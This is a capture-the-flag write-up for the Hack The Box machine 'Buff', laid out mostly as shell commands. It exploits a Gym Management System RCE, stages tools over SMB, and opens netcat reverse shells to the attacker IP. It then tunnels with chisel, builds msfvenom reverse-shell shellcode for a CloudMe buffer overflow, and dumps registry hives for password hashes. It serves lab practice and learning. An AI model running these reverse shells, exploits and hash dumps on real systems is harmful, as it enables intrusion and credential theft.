# buff

Buff ran on `10.10.10.198`. My IP was `10.10.14.69`

<details>
<summary>used techniques</summary>

* php webapp exploit to get a webshell
* transferring files via impacket samba server
* reverse shell via netcat
* rebinding a local port via chisel
* finding an exploit with winpeas
* privilege escalation with a buffer overflow

</details>

> enumeration with Kali

```sh
openvpn 00be.ovpn # connect to the network.
ping 10.10.10.198 # make sure Buff is up.

cd /root/projects && mkdir buff
cd buff

echo '10.10.10.198 buff' >> /etc/hosts
sup 10.10.10.198 # or buff
# as soon as one scan is done, open new terminal and run:
so # sets p (ports) and h (host) variable from scan result.

webp=8080 # where we foud a webserver.
tail -F dirb.log | grep --line-buffered ^== # blocking.
dirb http://$h:$webp -o dirb.log # look for interesting folders.

# in the kali VM we can reach the vuln box:
# (via the openvpn connection)
curl 10.10.10.198:8080 # works.

# If we want to use the VM host to browse it:
# on the host we will use local port forwarding:
h=10.10.10.198
p=8080
ssh -N kali -L localhost:80:$h:$webp
# now we can browse it with a browser under: http://localhost/ on the VM host.
# use Wappalyzer.
# browse around -> Contact
#   -> made using Gym Management Software 1.0

searchsploit gym management # systems, not software!
# took me a bit to figure out the different name.
# https://www.exploit-db.com/exploits/48506

# Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py
cp /usr/share/exploitdb/exploits/php/webapps/48506.py .
```

> getting a foothold with Kali

```sh
# exploit the webapp for a webshell (a weird one):
rlwrap python2 48506.py http://$h:$webp/
# rlwrap makes this much more bearable but we still can't traverse directories.
# for missing requirements: see the main readme.
```

> enumeration on Buff via webshell

```sh
dir # =ls
  # all the tools people leave laying around...
whoami /all # =id
  # buff\shaun
systeminfo # =uname
  # Win 10
  # x64
set # =env
  # userdomain: BUFF
tasklist # =ps
ipconfig /all # =ifconfig
```

> on Kali

```sh
mkdir share && cd share

# git files:
cp $(locate nc.exe) . # don't forget about updatedb when using locate!
cp /opt/chisel*win* chisel.exe # does not come with Kali.

impacket-smbserver share . -smb2support# blocking.
# alternatively deposit files via a webserver.
rlwrap nc -nlvp 42424 # blocking. will open cmd.exe for a proper reverse shell in a bit.
# rlwrap also gives us a reverse search history!
```

> more enumeration on Buff via webshell

```sh
# copy netcat to Buff.
copy \\10.10.14.69\\share\\nc.exe .
copy \\10.10.14.69\\share\\chisel.exe .

# let's get a proper shell!
nc.exe 10.10.14.69 42424 -e cmd.exe
# alternatives: chisel.exe, plink.exe
# you don't even need to download netcat:
\\10.10.14.69\\share\\nc.exe 10.10.14.69 42424 -e cmd.exe # better!

# or from kali:
curl 'http://buff:8080/upload/kamehameha.php?telepathy=nc.exe%2010.10.14.69%2042424%20-e%20cmd'
```

> on Buff via proper reverse shell

```sh
# from proper shell.
dir
cd ../../../../../../..
robocopy /e xampp \\10.10.14.69\\share # takes forever.
# search for sql lines with: ag sql --color | less

# ---

# while that runs open a second webshell and
# upgrade it via reverse shell method.

cd ../../../../..
dir users
cd users/shaun/desktop
type user.txt
# User flag:
# 5302b97d72d2fd625f1d2d0606ba2d5a
copy user.txt \\10.10.14.69\\share

cd %temp%
mkdir oobe # let's create our own little folder!
cd oobe

# todo: copy this to your kali share folder, then:
copy \\10.10.14.69\\share\\winpeas.exe .
winpeas > winpeas.log

systeminfo > systeminfo.log
tasklist /v > tasklist.log
netstat -aon > netstat.log
# netstat -aon | findstr LISTEN | findstr 127

copy *.log \\10.10.14.69\\share /y
```

> take a look at the logs on Kali

```sh
# check out the winpeas log:
less -R winpeas.log # read it yourself.
grep CVE --binary-files=text winpeas.log # get all CVEs.

# this seems a bit redundant after winpeas:
python /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py \
 --database 2020-10-18-mssb.xls \
 --systeminfo sysminfo.log \
 > exploits.log

grep -i listening netstat.log # careful, only for english versions!
```

I think at this point you are supposed to find the icloudme setup file
in the download folder and deduce that one of the locally bound services
is just that. I did not, had to look up a hint.

iCloudme 1.11.2 is vulnerable to this exploit:
* https://www.exploit-db.com/exploits/48389

> listen on Kali

```sh
/opt/chisel_1.7.1_linux_386 server --port 12345 --reverse
```

> connect from Buff

```sh
chisel.exe client 10.10.14.69:12345 R:8888:127.0.0.1:8888
```

> on Kali
```sh
nc -lnvp 3667 # for reverse shell.

# we don't want to launch the calculator so let's update the payload:
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.69 LPORT=3667 -b '\x00\x0A\x0D' -f python -v payload > payload
cp 48389.py 48389_new-payload.py

# replace the payload in our new copy.

# run it:
python2 48389_new-payload.py
# now we have a root shell!
```

> for fun: dump hashes as admin
```sh
# as windows admin:
reg.exe save hklm\sam sam.reg
reg.exe save hklm\security security.reg
reg.exe save hklm\system system.reg

# on kali:
impacket-secretsdump -security security.reg -sam sam.reg -system system.reg LOCAL > hashes.txt
```
